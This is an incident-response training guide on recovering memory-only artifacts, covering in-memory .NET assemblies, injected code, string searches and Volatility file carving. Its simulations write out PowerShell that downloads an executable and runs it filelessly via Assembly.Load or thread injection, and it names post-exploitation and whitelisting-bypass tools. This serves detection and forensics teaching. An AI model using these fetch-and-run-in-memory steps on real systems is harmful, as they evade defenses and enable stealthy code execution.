# Obtaining Artifacts From Memory

In-memory artifacts enable us to perform full analysis and event reconstruction when a system is under investigation.  We must be prepared to respond to incidents where modern malware loads itself over the network, decrypts itself in memory, and runs untrusted code without writing to disk.  We also must be prepared for incidents where users intentionally stay in memory to avoid leaving artifacts that would lead to detection and analysis. The key to responding to each of these is being able to access and analyze system memory, identify the relevant code and data being used, and provide an accurate and complete reconstruction of events.

This document reviews some ways we can recover memory-only artifacts not available on disk or the network:   

- [Memory Artifacts Review](#memory-artifacts-review)
- [Identifying In-Memory DotNet Assemblies](#identifying-in-memory-dotnet-assemblies)
- [Identifying Injected Code](#identifying-injected-code)
- [Searching for Strings and Data](#searching-for-strings-and-data)
- [Carving Files with Volatility](#carving-files-with-volatility)


## Memory Artifacts Review

When a program runs, it runs in a container called a "process" that allows threads to execute and access resources such as files, registry keys, network sockets, etc. 

Every process is allocated memory address space that is separated into blocks of memory called
segments which hold code and data and have access permissions.  

As the program executes in memory and different functions are called to perform different tasks, we can inspect this code and data in order to identify the tasks being executed inside the process.

Here are some examples of memory-only artifacts:

|Type|Description|
|-|-|
|Residual data|Data from disconnected external media devices, previous boots, terminated shells, wiped event logs and browser history no longer available on disk|
|Volatile data|Registry keys manipulated directly in memory are not written to disk and can be used to track user activity or locate malware persistence|
|Network data|Evidence of proxy or port redirection, network share data, traffic traversing SSH/VPN tunnels, encrypted communications, connected wireless devices|
|Hidden services|Services can be running with no traces in event log, registry, or memory of services.exe, but running process, DLL, or kernel driver is still in memory|
|File data|Recently used files, deleted files, executable paths and timestamps allow evidence of file execution/knowledge, directory traversal|
|Application data|Data an application received over the network, decompressed and/or decrypted instructions in memory, encryption keys|
|Command History|Extract full console input and output, data from user/attacker sessions such as usernames, passwords, programs/files accessed|
|SIDs/Privileges obtained|User, group, and privilege information associated with user and attacker-controlled accounts and malicious processes|
|Malware-created artifacts|Parameters of the infection, C2 and exfiltration data, hidden files and processes, hooked drivers, injected code|
|Anti-forensic artifacts|Evidence of file wiper use, programs run from removable devices, event log modifying/deleting, resetting timestamps|
|Passwords|Plaintext passwords stored by OS/applications that may be reused on other systems/services, passwords for encrypted files and containers|

<br>

It may also be helpful to review some of these other training documents related to memory-only techniques:

- [Memory Analysis with Volatility](./Memory%20Analysis%20with%20Volatility.md)
- [Phishing To Injection Techniques](./Phishing%20To%20Injection%20Techniques.md)
- [Review of Windows Scripting Technologies](./Review%20of%20Windows%20Scripting%20Technologies.md)
- [Debugging a Windows Program](./Debugging%20a%20Windows%20Program.md)
- [Detecting Unmanaged PowerShell](./Detecting%20Unmanaged%20Powershell.md)
- [Application Whitelisting Bypasses](./Application%20Whitelisting%20Bypasses.md)
- [Bits, Bytes, and Encoding](./Bits%20Bytes%20and%20Encoding.md)
- [Memory-based Attack Techniques](./Memory-based%20Attack%20Techniques.md)
- [Windows Processes and Memory Analysis](./Windows%20Processes%20and%20Memory%20Analysis.md)


## Identifying In-Memory DotNet Assemblies

[DotNet assemblies](https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks) can be dynamically loaded into memory using the `Assembly.Load(byte[])` function to run untrusted programs to bypass application whitelisting and avoid writing artifacts to disk.

Here are several examples:

- Post-Exploitation tools such as [Empire](https://github.com/EmpireProject/Empire) and [Cobalt Strike](https://www.cobaltstrike.com/) can inject .NET assemblies (PowerShell runner DLLs) into any process in memory 

- Multiple [Application Whitelisting Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) exist where signed applications that call the `Assembly.Load()` method like `MSBuild.exe` and `InstallUtil.exe` are made to run unsigned .NET assemblies which can access Windows APIs

- JScript tools such as [DotNetToJScript](https://github.com/tyranid/DotNetToJScript), [Starfighters](https://github.com/Cn33liz/StarFighters), and [CactusTorch](https://github.com/mdsecactivebreach/CACTUSTORCH) run .NET assemblies in memory providing Windows API access

Let's see what this looks like by simulating it with our favorite C# program `GoTeam.cs`:

```c#
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;

[ComVisible(true)] 
public class GoTeam
{
        public static void Main()
        {
                string answer;
                Console.WriteLine("Enter your favorite sports team: ");
                answer = Console.ReadLine();
                if (answer == "saints") {
                        Console.WriteLine("Who dat!");
                }
                else {
                        Console.WriteLine("Go " + answer + "!");
                }
        }
        public void SayGo(string team)
        {
                Console.WriteLine("Go " + team + "!");
        }
}
```

Using `csc.exe -out:GoTeam.exe GoTeam.cs`, this can code can be compiled into the benign program `GoTeam.exe` which prompts the user for their favorite sports team, then provides a response depending on the team given.

The following commands will download the compiled program into memory and run it with Powershell:

```powershell
$uri = 'https://s3.amazonaws.com/exercise-pcap-download-link/GoTeam.exe'
$exe = Invoke-WebRequest -Uri $uri
$Base64 = [System.Convert]::ToBase64String($exe.Content)
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($Base64)).EntryPoint.Invoke($Null, $Null)
```

After this last command, the `GoTeam.exe` program will be running inside the memory space of the PowerShell process. 

![](images/Obtaining%20Artifacts%20From%20Memory/image017.png)<br><br>

Check task manager and you will not see any processes that resemble a `GoTeam` process running.

![](images/Obtaining%20Artifacts%20From%20Memory/image018.png)<br><br>

It won't be shown as a loaded module within the process either:

![](images/Obtaining%20Artifacts%20From%20Memory/image019.png)<br><br>

So how do we detect this?

The [Get-ClrReflection](https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks) function written by Joe Desimone will detect memory-only CLR (.NET) modules.  It scans all processes for executables that are in memory regions of `MEM_MAPPED` type, `PAGE_READWRITE` permissions, and are not associated with a file on disk.

Running this function finds a reflectively loaded assembly and saves it to disk:

![](images/Obtaining%20Artifacts%20From%20Memory/image020.png)<br><br>

It is the `GoTeam.exe` executable that was downloaded:

![](images/Obtaining%20Artifacts%20From%20Memory/image021.png)<br><br>

Let's dump the process's memory by piping the process object to `Get-ProcessDump` which is based on [Out-Minidump](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) from PowerSploit:

![](images/Obtaining%20Artifacts%20From%20Memory/image024.png)<br><br>

We can now easily search raw memory with any tool we want:

![](images/Obtaining%20Artifacts%20From%20Memory/image025.png)<br><br>

## Identifying Injected Code

There are a [number of different memory injection techniques](./Phishing%20To%20Injection%20Techniques.md#memory-injection-techniques) that can also be used to run untrusted code inside the memory of a process.

When EXEs and DLLs are loaded into memory to run, they should have an associated file path which corresponds to their actual location on the disk. However, it is possible to load a file into memory from over the network so that the program executing is never written to disk.

We can simulate this technique by downloading the benign program `GoTeam.exe` and writing it into memory with the `New-InjectedThread` function from Jared Adkinson's [PSReflect-Functions](https://github.com/jaredcatkinson/PSReflect-Functions):

```
$uri = 'https://s3.amazonaws.com/exercise-pcap-download-link/GoTeam.exe'
$exe = Invoke-WebRequest -Uri $uri 
New-InjectedThread -Id $pid -ByteArray $exe.Content
```

The `New-InjectedThread` function allocates PAGE_EXECUTE_READWRITE (RWX) memory in the process and writes the bytes of the program to it: 

![](images/Obtaining%20Artifacts%20From%20Memory/image026.png)<br><br>

Open up an admin PowerShell window and detect this with the `Get-InjectedThread` function:

![](images/Obtaining%20Artifacts%20From%20Memory/image027.png)<br><br>

We now know the base address of the memory segment the program was written to and can use the `Get-ProcessMemoryInfo` function from [PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal) to find it:

![](images/Obtaining%20Artifacts%20From%20Memory/image028.png)<br><br>

Use the `Get-RawBytes` function to dump all the bytes stored in that memory segment and save it to a file named `Injected.exe`:

![](images/Obtaining%20Artifacts%20From%20Memory/image029.png)<br><br>

## Searching For Strings and Data

Many cases involve retrieving files and data from a user's system.  Memory is a great place to find these artifacts, especially in chat and messaging applications like Slack.

Use `$p = Get-ActiveProcesses` to capture all processes on a system so that you can begin filtering out processes that are relevant to the investigation:

![](images/Obtaining%20Artifacts%20From%20Memory/image012.png)<br><br>

Use `Get-ProcessStrings`, another memory tool from [PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal), to capture all strings from the memory space of a process.  If you want to search images too, use the `-IncludeImages` switch.  If you just want ASCII strings or Unicode strings you can specify with the `-Encoding` parameter (it searches for both by default).  You can also specify the minimum length of strings by using the `-MinimumLength` parameter.

This obtains all Unicode and ASCII strings discovered in the memory of this process:

```powershell
$strings = Get-ProcessStrings -ProcessID 20656
```
<br>

Each object has a `String`, `Encoding` and `BaseAddress` property which we can use to filter out the results we want:

![](images/Obtaining%20Artifacts%20From%20Memory/image013.png)<br><br>

This was pulled from one of the comments in a Slack channel:

![](images/Obtaining%20Artifacts%20From%20Memory/image015.png)<br><br>

You can also use regular expressions to search these objects for interesting strings:

![](images/Obtaining%20Artifacts%20From%20Memory/image014.png)<br><br>


## Carving Files with Volatility

Memory is always changing and if a copy of physical memory can be obtained from a system, the earlier the better.  The memory image can then be searched for artifacts with tools like Volatility.

Common scenarios require us to obtain artifacts from a system that have been deleted.  In these cases if we know what processes were involved, we can narrow the search space down to a few processes, determine what memory space they were using, and examine it for artifacts and evidence of user actions.

Here is an example of a file that was uploaded to the Slack application:

![](images/Obtaining%20Artifacts%20From%20Memory/image001.png)<br><br>

It shows as a private file and the original file can now be deleted and no longer available on the user's system:

![](images/Obtaining%20Artifacts%20From%20Memory/image002.png)<br><br>
 
Memory was acquired with FireEye and in this case turned out to be 34 GB in size:

![](images/Obtaining%20Artifacts%20From%20Memory/image003.png)<br><br>
 
Volatility was used to display the processes active at the time of the memory capture and identify all Slack processes:

![](images/Obtaining%20Artifacts%20From%20Memory/image004.png)<br><br>
 
Volatility's `yarascan` plugin was used to search for and alert on any PDF magic numbers in the Slack processes:

![](images/Obtaining%20Artifacts%20From%20Memory/image005.png)<br><br>
 
The Yara rule hit on process 8620:

![](images/Obtaining%20Artifacts%20From%20Memory/image006.png)<br><br>
 
Next, we need to find what physical memory space Slack was using, then use `filescan` to show files from that space.

Here, the physical offset is identified with the `filescan` plugin:

![](images/Obtaining%20Artifacts%20From%20Memory/image007.png)<br><br>
 
Dumping the file with the `dumpfiles` plugin requires providing the physical offset of where the file is stored in memory:

![](images/Obtaining%20Artifacts%20From%20Memory/image008.png)<br><br>
 
The file is dumped as a Data Section Object (.dat):

![](images/Obtaining%20Artifacts%20From%20Memory/image009.png)<br><br>
 
This was renamed to a `.pdf` file but did not display when attempting to open it with Adobe:

![](images/Obtaining%20Artifacts%20From%20Memory/image010.png)<br><br>
 
However, Chrome has a built-in PDF reader and in this case was able to open and display the entire PDF:
 
![](images/Obtaining%20Artifacts%20From%20Memory/image011.png)<br><br>

## Summary

The `Get-ClrReflection`, `Get-ProcessDump`, `New-InjectedThread`, `Get-ProcessMemoryInfo`, `Get-RawBytes`, and `Get-ProcessStrings` functions have been added to the [IRmodule](../scripts/Modules/IRmodule.psm1).  Try them out and let me know if you have any questions or suggestions.
